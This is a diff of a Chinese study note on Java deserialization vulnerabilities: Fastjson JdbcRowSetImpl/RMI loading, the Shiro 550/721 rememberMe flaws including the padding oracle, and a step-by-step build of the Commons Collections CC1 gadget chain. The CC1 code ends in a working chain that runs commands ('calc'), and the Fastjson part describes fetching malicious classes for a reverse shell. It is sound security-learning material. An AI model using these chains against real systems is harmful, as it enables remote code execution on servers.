@@ -72,6 +72,10 @@ class iphone implements Fruit {
 
 ```
 攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。
+
+（我们可以直接访问到目标机，目标机大概率有一个传参点，我们传参的时候抓包，在里面加入@type后面跟jdbcrowsetimpl类，jdbc类会自动访问rmi服务器，我们提前将恶意.class文件通过工具放在rmi服务器，这样rmi服务器就会将恶意class文件当做响应包传回目标机，目标机会自动执行，然后成功）
+
+
 存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令啊？
 rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping dnslog或者创建文件或者反弹shell啥的）
 rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。
@@ -92,7 +96,7 @@ rmi将远程加载得到的class（恶意代码），作为响应返回给靶机
 
 使用fastjson进行序列化和反序列化操作：
 
-```
+```java
 public class Fastjson {
     public static void main(String[] args) {
         user user = new user("Bob", "123.com");
@@ -101,6 +105,7 @@ public class Fastjson {
         String json1 = JSON.toJSONString(user);
         System.out.println(json1);//{"password":"123.com","username":"Aur0ra.sec"}
         String json2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+        //这个SerializerFeature.WriteClassName 就是储存序列化前的具体类型的。
         System.out.println(json2);//{"@type":"com.aur0ra.sec.fastjson.User","password":"123.com","username":"Aur0ra.sec"}
 
 
@@ -221,7 +226,7 @@ public class myFastJasonDemo2 {
     public static void main(String[] args) {
 
         String s="{\"age:\"21\"name:\"lisa\"}";
-        person p=JSON.parseObject(s,person.class);
+        person p=JSON.parseObject(s,person.class);这里指定解析类型的对象为person.class
         System.out.println(person.getName());
     }
 
@@ -343,8 +348,6 @@ public class myFastJasonDemo2 {
 
 <img src="image/image-20231018181939302-169985848018514.png" alt="image-20231018181939302" style="zoom:80%;" />
 
-
-
 继续跟进到parse的第二个构造方法，这里是一段switch语句获取token来判断json格式，当开头为 **{** 时token为12，则进入到LBRACE分支
 
 <img src="image/image-20231018182323639-169985848018518.png" alt="image-20231018182323639" style="zoom:80%;" />
@@ -411,10 +414,11 @@ public class myFastJasonDemo2 {
 
 - **FastJson不需要实现Serializable**（序列化接口）
 - **不需要变量不是transient/可控变量：**
+  
   1. 变量有对应的setter
   2. 或是public/static
   3. 或满足条件的getter(返回值是)：
-
+  
 - **反序列化入口点不是readObject，而是setter或者是getter**
 
 - **执行点是相同的：反射或者类加载**
@@ -1393,7 +1397,7 @@ nextToken方法在case 16会判断ch的值，然后根据ch的值设置token，�
 
 ## shiro
 
-#### shiro550：
+### shiro550：
 
 #### 原理
 
@@ -1402,7 +1406,7 @@ Shiro 550 反序列化漏洞存在版本：shiro <1.2.4，产生原因是因为s
 反过来思考一下，如果我们构造该值为一个cc链序列化后的值进行该密钥aes加密后进行base64加密，那么这时候就会去进行反序列化我们的payload内容，这时候就可以达到一个命令执行的效果。
 
 ```
-获取rememberMe值 -> Base64解密 -> AES解密 -> 调用readobject反序列化操作
+获取rememberMe值 -> Base64解密 -> AES解密（默认硬编码在里面，不可更改）所以密钥公开，可以利用 -> 调用readobject反序列化操作
 ```
 
 #### 分析
@@ -1766,3 +1770,713 @@ public class Shiro550_Exp {
 <img src="image/image-20231122215219157-17030805338551.png" alt="image-20231122215219157" style="zoom:80%;" />
 
 <img src="image/image-20231122215333208-17030805338562.png" alt="image-20231122215333208" style="zoom:80%;" />
+
+### shiro721：
+
+#### 流程分析
+
+1. 登录网站获取正确的Cookie值（remeberMe）
+2. 使用rememberMe字段进行Padding Oracle Attack，获取intermediary
+3. 利用intermediary构造出恶意的反序列化密文作为Cookie
+4. 使用新的Cookie请求网站执行攻击
+
+#### 漏洞分析
+
+在shiro550中，密钥直接写在源码中，而在shiro721中，密钥动态生成查看
+
+```
+public AbstractRememberMeManager() {
+    this.serializer = new DefaultSerializer<PrincipalCollection>();
+    AesCipherService cipherService = new AesCipherService();
+    this.cipherService = cipherService;
+    setCipherKey(cipherService.generateNewKey().getEncoded());
+}
+```
+
+查看generateNewKey方法
+
+```
+public Key generateNewKey() {
+    return generateNewKey(getKeySize());
+}
+```
+
+其中这里的getKeySize是获取key的长度
+ 再进入到重载的generateNewKey方法
+
+```
+public Key generateNewKey(int keyBitSize) {
+    KeyGenerator kg;
+    try {
+        // 根据算法名字初始化一个密钥生成器对象
+        kg = KeyGenerator.getInstance(getAlgorithmName());
+    } catch (NoSuchAlgorithmException e) {
+        String msg = "Unable to acquire " + getAlgorithmName() + " algorithm.  This is required to function.";
+        throw new IllegalStateException(msg, e);
+    }
+    // 初始化
+    kg.init(keyBitSize);
+    return kg.generateKey();
+}
+```
+
+[![img](https://xzfile.aliyuncs.com/media/upload/picture/20231116234506-1d91ebea-8497-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231116234506-1d91ebea-8497-1.png)
+ 进入init方法
+
+```
+public final void init(int var1) {
+    this.init(var1, JceSecurity.RANDOM);
+}
+```
+
+这里的var1指的是key的长度，即128，调用重载方法init
+
+```
+public final void init(int var1, SecureRandom var2) {
+    // var1表示key的大小
+    // var2表示用于生成随机数的安全随机数生成器
+    if (this.serviceIterator == null) {
+        this.spi.engineInit(var1, var2);
+    } else {
+        // 如果"serviceIterator"不为null，表示有多个服务提供者实现可用。在这种情况下，会进入一个循环，不断尝试调用不同的服务提供者实现来初始化密钥生成器
+        RuntimeException var3 = null;
+        KeyGeneratorSpi var4 = this.spi;
+
+        while(true) {
+            try {
+                // 初始化密钥生成器
+                var4.engineInit(var1, var2);
+                this.initType = 4;
+                this.initKeySize = var1;
+                this.initParams = null;
+                this.initRandom = var2;
+                return;
+            } catch (RuntimeException var6) {
+                if (var3 == null) {
+                    var3 = var6;
+                }
+                // 取下一个可用的服务提供者实现
+                var4 = this.nextSpi(var4, false);
+                if (var4 == null) {
+                    throw var3;
+                }
+            }
+        }
+    }
+}
+```
+
+这个方法主要是用于获取初始化密钥生成器
+ 回到generateNewKey方法，初始化完成后，调用generateKey方法
+
+```
+public final SecretKey generateKey() {
+    if (this.serviceIterator == null) {
+        return this.spi.engineGenerateKey();
+    } else {
+        RuntimeException var1 = null;
+        KeyGeneratorSpi var2 = this.spi;
+
+        while(true) {
+            try {
+                // 生成密钥
+                return var2.engineGenerateKey();
+            } catch (RuntimeException var4) {
+                if (var1 == null) {
+                    var1 = var4;
+                }
+
+                var2 = this.nextSpi(var2, true);
+                if (var2 == null) {
+                    throw var1;
+                }
+            }
+        }
+    }
+```
+
+![image-20240702112533302](image/image-20240702112533302.png)
+
+进入到engineGenerateKey方法
+
+```
+protected SecretKey engineGenerateKey() {
+    SecretKeySpec var1 = null;
+    if (this.random == null) {
+        this.random = SunJCE.getRandom();
+    }
+
+    byte[] var2 = new byte[this.keySize];
+    this.random.nextBytes(var2);
+    var1 = new SecretKeySpec(var2, "AES");
+    return var1;
+}
+```
+
+![image-20240702112704900](image/image-20240702112704900.png)
+ 随机生成相应长度的key后，返回SecretKeySpec对象
+ 最后再回到AbstractRememberMeManager的构造函数使用getEncoded方法获取密钥序列
+
+```
+public byte[] getEncoded() {
+    return (byte[])this.key.clone();
+}
+```
+
+#### Padding Oracle Attack攻击
+
+原理：[https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/](https://skysec.top/2017/12/13/padding-oracle和cbc翻转攻击/)
+ https://goodapple.top/archives/217
+ 这是一种类似于SQL盲注的攻击方法，所以需要寻找到返回结果的不同状态
+ **Padding错误时返回的状态**：
+ 回到AbstractRememberMeManager的解密函数
+
+```
+protected byte[] decrypt(byte[] encrypted) {
+    byte[] serialized = encrypted;
+    CipherService cipherService = getCipherService();
+    if (cipherService != null) {
+        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
+        serialized = byteSource.getBytes();
+    }
+    return serialized;
+}
+```
+
+按照流程进入JcaCipherService类的decrypt方法，处理好iv和对应的密文后，进入重载的decrypt方法
+
+```
+private ByteSource decrypt(byte[] ciphertext, byte[] key, byte[] iv) throws CryptoException {
+    if (log.isTraceEnabled()) {
+        log.trace("Attempting to decrypt incoming byte array of length " +
+                (ciphertext != null ? ciphertext.length : 0));
+    }
+    byte[] decrypted = crypt(ciphertext, key, iv, javax.crypto.Cipher.DECRYPT_MODE);
+    return decrypted == null ? null : ByteSource.Util.bytes(decrypted);
+}
+```
+
+进入crypt方法
+
+```
+private byte[] crypt(byte[] bytes, byte[] key, byte[] iv, int mode) throws IllegalArgumentException, CryptoException {
+    if (key == null || key.length == 0) {
+        throw new IllegalArgumentException("key argument cannot be null or empty.");
+    }
+    javax.crypto.Cipher cipher = initNewCipher(mode, key, iv, false);
+    return crypt(cipher, bytes);
+}
+```
+
+进入重载方法
+
+```
+private byte[] crypt(javax.crypto.Cipher cipher, byte[] bytes) throws CryptoException {
+    try {
+        return cipher.doFinal(bytes);
+    } catch (Exception e) {
+        String msg = "Unable to execute 'doFinal' with cipher instance [" + cipher + "].";
+        throw new CryptoException(msg, e);
+    }
+}
+```
+
+这里调用了doFinal函数对字节码进行处理，步入
+
+```
+public final byte[] doFinal(byte[] var1) throws IllegalBlockSizeException, BadPaddingException {
+    // 检查加密器/解密器的状态
+    this.checkCipherState();
+    if (var1 == null) {
+        throw new IllegalArgumentException("Null input buffer");
+    } else {
+        this.chooseFirstProvider();
+        return this.spi.engineDoFinal(var1, 0, var1.length);
+    }
+}
+```
+
+这个方法会抛出两个异常，分别是IllegalBlockSizeException（块大小异常）和BadPaddingException（填充错误异常），这里使用的是throws，会将异常抛至上一层方法，逐层往上，直到getRememberedPrincipals方法中使用onRememberedPrincipalFailure进行处理
+
+```
+public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
+    PrincipalCollection principals = null;
+    try {
+        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
+        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
+        if (bytes != null && bytes.length > 0) {
+            principals = convertBytesToPrincipals(bytes, subjectContext);
+        }
+    } catch (RuntimeException re) {
+        // 这里
+        principals = onRememberedPrincipalFailure(re, subjectContext);
+    }
+
+    return principals;
+}
+```
+
+进入onRememberedPrincipalFailure方法
+
+```
+protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {
+
+    if (log.isWarnEnabled()) {
+        String message = "There was a failure while trying to retrieve remembered principals.  This could be due to a " +
+                "configuration problem or corrupted principals.  This could also be due to a recently " +
+                "changed encryption key, if you are using a shiro.ini file, this property would be " +
+                "'securityManager.rememberMeManager.cipherKey' see: http://shiro.apache.org/web.html#Web-RememberMeServices. " +
+                "The remembered identity will be forgotten and not used for this request.";
+        log.warn(message);
+    }
+    // 这里
+    forgetIdentity(context);
+    //propagate - security manager implementation will handle and warn appropriately
+    throw e;
+}
+```
+
+此方法调用了forgetIdentity方法进行处理
+
+```
+private void forgetIdentity(HttpServletRequest request, HttpServletResponse response) {
+    getCookie().removeFrom(request, response);
+}
+```
+
+removeFrom方法
+
+```
+public void removeFrom(HttpServletRequest request, HttpServletResponse response) {
+    String name = getName();
+    String value = DELETED_COOKIE_VALUE;
+    String comment = null; //don't need to add extra size to the response - comments are irrelevant for deletions
+    String domain = getDomain();
+    String path = calculatePath(request);
+    int maxAge = 0; //always zero for deletion
+    int version = getVersion();
+    boolean secure = isSecure();
+    boolean httpOnly = false; //no need to add the extra text, plus the value 'deleteMe' is not sensitive at all
+
+    addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);
+
+    log.trace("Removed '{}' cookie by setting maxAge=0", name);
+}
+```
+
+removeForm主要在response头部添加字段Set-Cookie: rememberMe=deleteMe
+
+**Padding正确，反序列化失败**：
+ 在DefaultSerializer类的反序列化函数中进行了处理
+
+```
+public T deserialize(byte[] serialized) throws SerializationException {
+    if (serialized == null) {
+        String msg = "argument cannot be null.";
+        throw new IllegalArgumentException(msg);
+    }
+    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
+    BufferedInputStream bis = new BufferedInputStream(bais);
+    try {
+        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
+        @SuppressWarnings({"unchecked"})
+        T deserialized = (T) ois.readObject();
+        ois.close();
+        return deserialized;
+    } catch (Exception e) {
+        String msg = "Unable to deserialize argument byte array.";
+        throw new SerializationException(msg, e);
+    }
+}
+```
+
+但对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化
+ **两种状态**：
+
+1. padding正确，服务器给出正确响应
+2. padding错误，服务器返回Set-Cookie: rememberMe=deleteMe
+
+
+
+## CC链
+
+### cc1
+
+#### 流程分析
+
+首先找到transformer这个接口，发现有很多实现类
+
+<img src="image/image-20240702145232825.png" alt="image-20240702145232825" style="zoom: 80%;" />
+
+发现有14个实现类，审计后找到既调用了transform方法又可以实现序列化的类，这里我们找到了invokertransformer这个类
+
+跟进invokertransformer这个类，找到重写的transform方法，可以看到其中利用了反射，假设这些参数可控那么利用反射就可以实现任意命令执行,所以我们下面来看他的构造器（实例化）
+
+<img src="image/image-20240702145644343.png" alt="image-20240702145644343" style="zoom: 67%;" />
+
+发现有两种构造器，其中一个构造器接受了三种参数。从字面意思可以知道String methodName是方法名，Class[] paramTypes是参类型，Object[] args就是参数了
+
+<img src="image/image-20240702154133663.png" alt="image-20240702154133663" style="zoom:80%;" />
+
+再结合构造器回来看transform的参数，知道参数都是可控的，可以来调用任意类的任意方法
+
+<img src="image/image-20240703154859747.png" alt="image-20240703154859747" style="zoom:80%;" />
+
+参照之前对于反射的利用
+
+```java
+Runtime r=Runtime.getRuntime();//获取类对象
+ Class c=r.getClass();//获取对象的类
+ Method m=c.getMethod("exec", String.class);
+ m.invoke(r,"calc");//弹计算机
+```
+
+同理
+
+```java
+Runtime r=Runtime.getRuntime();//获取类对象//因为要命令执行所以是runtime对象
+InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}); //传入的是方法里的三个参数， //方法名为exec，参数类型为String，参数值为calc//指定构造器，给参数赋值
+invokerTransformer.transform(r);//相当于是用invokertransform类里的transform方法，因为transform里面含有invoke反射，所以就可以帮我们调用反射。这里的runtime对应transform的input
+
+//先获取一个runtime对象，然后再指定构造器，给参数赋值，再调用transform方法时，就会调用到里面的invoke方法，就会触发反射
+```
+
+<img src="image/image-20240702155907616.png" alt="image-20240702155907616" style="zoom: 67%;" />
+
+#### 调用链分析
+
+我们已经找到了利用类，并且找到了利用方法就是invokertransfomer中的transform，所以尝试往出口寻找，看看是哪个类调用了同名的transform方法
+
+![image-20240702162612961](image/image-20240702162612961.png)
+
+这里我们找到了transformedmap类
+
+找到**TransformedMap**类，**TransformedMap** 是用于对 Java 标准数据结构 Map 进行修饰的工具。当一个 Map 被修饰成 **TransformedMap** 后，在添加新元素时，可以执行一个回调操作。构造方法的访问权限是 protected，因此需要使用 decorate  方法来创建对象。decorate 方法接受一个 Map 对象和两个转换器（transformer）对象作为参数，用于将普通的 Map 对象修饰成 **TransformedMap** 对象。
+
+先看看它的构造器
+
+    /**
+     * Constructor that wraps (not copies).
+     * <p>
+     * If there are any elements already in the collection being decorated, they
+     * are NOT transformed.
+     * 
+     * @param map  the map to decorate, must not be null
+     * @param keyTransformer  the transformer to use for key conversion, null means no conversion
+     * @param valueTransformer  the transformer to use for value conversion, null means no conversion
+     * @throws IllegalArgumentException if map is null
+     */
+    
+    //接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。
+    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+        super(map);
+        this.keyTransformer = keyTransformer;
+        this.valueTransformer = valueTransformer;
+    }
+
+发现transformedmap类又调用了三个transform方法
+
+<img src="image/image-20240702163030039.png" alt="image-20240702163030039" style="zoom: 67%;" />
+
+<img src="image/image-20240702163032569.png" alt="image-20240702163032569" style="zoom:80%;" />
+
+研究上面的两条链子发现到不了readobject，所以我们直接来看最后一个
+
+到这里我们的链子就走到了
+
+```java
+Runtime r=Runtime.*getRuntime*();
+InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
+ HashMap<Object,Object> map=new HashMap<>(); 
+
+ Map<Object,Object> transformedmap=TransformedMap.decorate(map,null,invokerTransformer);
+```
+
+```
+首先，我们找到了**TransformedMap**这个类，我们想要调用其中的**checkSetValue**方法，但是这个类的构造器是**peotected**权限，只能类中访问，所以我们调用**decorate**方法来实例化这个类，在此之前我们先实例化了一个**HashMap**,并且调用了**put**方法给他赋了一个键值对，然后把这个map当成参数传入，实例化成了一个**transformedmap**对象，这个对象也是Map类型的，然后我们对这个对象进行遍历，在遍历过程中我们可以调用**setValue**方法，而恰好又遇到了一个重写了**setValue的副类**，这个重写的方法刚好调用了**checkSetValue**方法，继续寻找底层readobject
+```
+
+这里我们发现找到的构造器以及checksetvalue方法都是protected权限，所以我们要找到一个内部实例化的方法
+
+<img src="image/image-20240703162950934.png" alt="image-20240703162950934" style="zoom:80%;" />
+
+<img src="image/image-20240703162953664.png" alt="image-20240703162953664" style="zoom:80%;" />
+
+找到一个public类型的decorate方法，且三个参数均为可控，而反观checkSetValue方法调用的是valueTransformer的transform方法
+
+我们要用这个方法现实例化 transformmap类，传入我们自己的transformer（invokertransformer）到这个valuetransformer(因为这个checksetvalue调用了这个valuetransformer的transform方法，所以我们这里可以传入我们的invokertransformer)，再来想办法调用checksetvalue方法
+
+![image-20240703165019660](image/image-20240703165019660.png)
+
+<img src="image/image-20240703164756413.png" alt="image-20240703164756413" style="zoom:80%;" />
+
+<img src="image/image-20240703163811862.png" alt="image-20240703163811862" style="zoom:80%;" />
+
+补充链子
+
+```java
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+public class MyTest {
+    public static void main(String[] args) {
+
+       Runtime r=Runtime.getRuntime();
+        InvokerTransformer invokerTransformer =new InvokerTransformer("exec",new Class[]{String.class},
+                new Object[]{"calc"});
+        invokerTransformer.transform(r);
+
+        HashMap map=new HashMap();//这里实例化了一个hashmap对象，为了传入decorate方法实现transformedmap的实例化
+        Map transformedMap =TransformedMap.decorate(map,null,invokerTransformer);//调用public方法decorate来实例化transformedmap
+
+       
+    }
+}
+```
+
+同样的接下来再来看看是谁调用了checkSetValue方法
+
+<img src="image/image-20240702163532629.png" alt="image-20240702163532629" style="zoom:67%;" />
+
+这里发现只有abstractinputcheckmapdecorator这个类
+
+跟进去看看
+
+<img src="image/image-20240702163645467.png" alt="image-20240702163645467" style="zoom:67%;" />
+
+发现是
+
+**AbstractInputCheckedMapDecorator**抽象类下的（**TransformedMap**继承了**AbstractInputCheckedMapDecorator**抽象类）**setValue**方法。
+
+分析后发现对map进行遍历可以调用到setvalve方法由此来调用checksetvalue方法，但是这里到后面并没有用到readobject方法，因此我们要找到一个readobject方法，可以遍历map并且调用这个setvalue方法。
+
+所以我们继续查找用法，看看有哪些方法里面调用了setValue并且可以被我们所利用，最好是直接来个重写过的readObject方法，里面调用了setValue
+
+<img src="image/image-20240703104827832.png" alt="image-20240703104827832" style="zoom:80%;" />
+
+我们继续查找setValue的用法，最后在AnnotationInvocationHandler类中找到了一个调用了setValue的readObject方法，同时还能代替Map的遍历过程
+
+可以看到readobject是private，所以这里我们再找到它的构造器
+
+<img src="image/image-20240703110342292.png" alt="image-20240703110342292" style="zoom:80%;" />
+
+//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类
+
+```java
+//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类
+AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
+        Class<?>[] superInterfaces = type.getInterfaces();
+        if (!type.isAnnotation() ||
+            superInterfaces.length != 1 ||
+            superInterfaces[0] != java.lang.annotation.Annotation.class)
+            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
+        this.type = type;
+        this.memberValues = memberValues;
+    }
+```
+
+可以看到这里并没有声明（public等），所以只能进行内部调用，外部调用则要利用反射
+
+看到里面的两个参数，后面的参数menbervalues是一个可控参数，我们可以传入自己需要的类，然后实现setvalue方法
+
+完善调用链
+
+```java
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class MyTest {
+    public static void main(String[] args) {
+
+        Runtime r=Runtime.getRuntime();//获取类对象//因为要命令执行所以是runtime对象
+        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},
+                new Object[]{"calc"});//传入的是方法里的三个参数， //方法名为exec，参数类型为String，参数值为calc//指定构造器，给参数赋值
+        invokerTransformer.transform(r);/*相当于是用invokertransform类里的transform方法，因为transform里面含有invoke反射，
+        所以就可以帮我们调用反射。这里的runtime对应transform的input*/
+
+        //先获取一个runtime对象，然后再指定构造器，给参数赋值，再调用transform方法时，就会调用到里面的invoke方法，就会触发反射
+
+        HashMap map=new HashMap();//这里实例化了一个hashmap对象，为了传入decorate方法实现transformedmap的实例化
+        Map transformedMap =TransformedMap.decorate(map,null,invokerTransformer);/*
+        调用public方法decorate来实例化transformedmap*/
+        
+          Class ano = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor = ano.getDeclaredConstructor(Class.class, Map.class);//获取私有构造器
+        constructor.setAccessible(true);
+        Object object = constructor.newInstance(Override.class, transformedMap);//反射的实例化方法newinsta
+        
+
+    }
+}
+
+```
+
+调用链补充完整
+
+```java
+public static void main(String[] args) throws Exception {
+        Runtime r=Runtime.*getRuntime*();
+        InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
+//        invokerTransformer.transform(r);
+        HashMap<Object,Object> map=new HashMap<>();
+        map.put("gxngxngxn","gxngxngxn");
+        Map<Object,Object> transformedmap=TransformedMap.*decorate*(map,null,invokerTransformer);
+
+/*        for(Map.Entry entry:transformedmap.entrySet()) {
+            entry.setValue(r);
+        }*/
+
+    //反射获取AnnotationInvocationHandler类
+        Class c=Class.*forName*("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class); //获取构造器
+        constructor.setAccessible(true); //修改作用域
+        constructor.newInstance(Override.class,transformedmap); //这里第一个是参数是注解的类原型，第二个就是我们之前的类
+        serialize(o);  //序列化
+        unserialize("C://java/CC1.txt"); //反序列化
+
+
+​    }
+
+    //定义序列化方法
+​    public static void serialize(Object object) throws Exception{
+​        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("C://java/CC1.txt"));
+​        oos.writeObject(object);
+​    }
+
+    //定义反序列化方法
+​    public static void unserialize(String filename) throws Exception{
+​        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
+​        objectInputStream.readObject();
+​    }
+```
+
+代入发现并不能执行弹计算机的命令，所以再分析问题
+
+#### 问题补充
+
+回到后面来看，我们知道runtime类是不能实例化的，没有序列化接口
+
+<img src="image/image-20240703112014132.png" alt="image-20240703112014132" style="zoom:80%;" />
+
+但是它的原生类class存在序列化接口是可以被序列化的
+
+<img src="image/image-20240703112408143.png" alt="image-20240703112408143" style="zoom:80%;" />
+
+但是要通过反射来获取
+
+所以我们反射来获取他的原型类：
+
+```java
+Class rc=Class.*forName*("java.lang.Runtime");                 //获取类原型
+Method getRuntime= rc.getDeclaredMethod("getRuntime",null);    //获取getRuntime方法，
+Runtime r=(Runtime) getRuntime.invoke(null,null);              //获取实例化对象，因为该方法无无参方法，所以全为null
+Method exec=rc.getDeclaredMethod("exec", String.class);        //获取exec方法
+exec.invoke(r,"calc");                                         //实现命令执行
+```
+
+上述这样就可以实现序列化，然后利用transform方法来实现整个反射的过程
+
+```java
+Class rc=Class.*forName*("java.lang.Runtime");
+
+/*Method getRuntime= rc.getDeclaredMethod("getRuntime",null);
+Runtime r=(Runtime) getRuntime.invoke(null,null);
+Method exec=rc.getDeclaredMethod("exec", String.class);
+exec.invoke(r,"calc");*/
+
+//利用transform方法实现上述代码
+
+        Method getRuntime= (Method) new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
+//这里模拟获取getRuntime方法，它的具体操作步骤类似之前
+
+        Runtime r=(Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);
+//这里模拟获取invoke方法
+
+        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
+//这里模拟获取exec方法，并进行命令执行
+```
+
+但是这样要一个个嵌套创建参数太麻烦了，我们这里找到了一个Commons  Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法:
+
+<img src="image/image-20240703150449019.png" alt="image-20240703150449019" style="zoom:80%;" />
+
+再结合起来
+
+```java
+Class rc=Class.forName("java.lang.Runtime");
+//创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历
+Transformer[] Transformers=new Transformer[]{
+        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+};
+//调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。
+ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);
+chainedTransformer.transform(Runtime.class);
+```
+
+但是还是不可以弹计算机
+
+再过来看发现是因为在调用**annotationInvocationHandler**类下的readobject方法时，存在两个判断条件
+
+<img src="image/image-20240703150927047.png" alt="image-20240703150927047" style="zoom:80%;" />
+
+在这里的位置下断点，并调试跟进，发现在这里的membertype为空，所以第一个if不通过，直接结束在这里
+
+<img src="image/image-20240703151030064.png" alt="image-20240703151030064" style="zoom:80%;" />
+
+这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的:
+
+<img src="image/image-20240703151137524.png" alt="image-20240703151137524" style="zoom:80%;" />
+
+而我们发现另一个注解:Target中有个名为value的成员变量，所以我们就可以使用这个注解,并改第一个键值对的值为value:
+
+<img src="image/image-20240703151225876.png" alt="image-20240703151225876" style="zoom:80%;" />
+
+通过if后这里看到，不再为空
+
+<img src="image/image-20240703151352418.png" alt="image-20240703151352418" style="zoom:80%;" />
+
+继续跟进发现，在setvalue的时候，我们传入的value值不是我们需要的runtime.class：
+
+<img src="image/image-20240703151527112.png" alt="image-20240703151527112" style="zoom:80%;" />
+
+这里就需要**ConstantTransformer**类，我们看到这个类里面也有transform，和构造器配合使用的话，我们传入什么值，就会返回某个值，这样就能将value的值转为**Runtime.class**
+
+<img src="image/image-20240703151637806.png" alt="image-20240703151637806" style="zoom:80%;" />
+
+再来看整条链子
+
+```java
+public static void main(String[] args) throws Exception {
+        Class rc=Class.*forName*("java.lang.Runtime");
+        Transformer[] Transformers=new Transformer[]{
+                new ConstantTransformer(Runtime.class), //添加此行代码，这里解决问题三
+                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);
+    //上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。
+
+        HashMap<Object,Object> map=new HashMap<>();
+        map.put("value","gxngxngxn"); //这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断
+        Map<Object,Object> transformedmap=TransformedMap.*decorate*(map,null,chainedTransformer);
+        Class c=Class.*forName*("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        Object o=constructor.newInstance(Target.class,transformedmap); //这里是问题二中第一个参数改注解为Target
+        *serialize*(o);
+        *unserialize*("C://java/CC1.txt");
+    }
+    public static void serialize(Object object) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("C://java/CC1.txt"));
+        oos.writeObject(object);
+    }
+    public static void unserialize(String filename) throws Exception{
+        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
+        objectInputStream.readObject();
+    }
+```
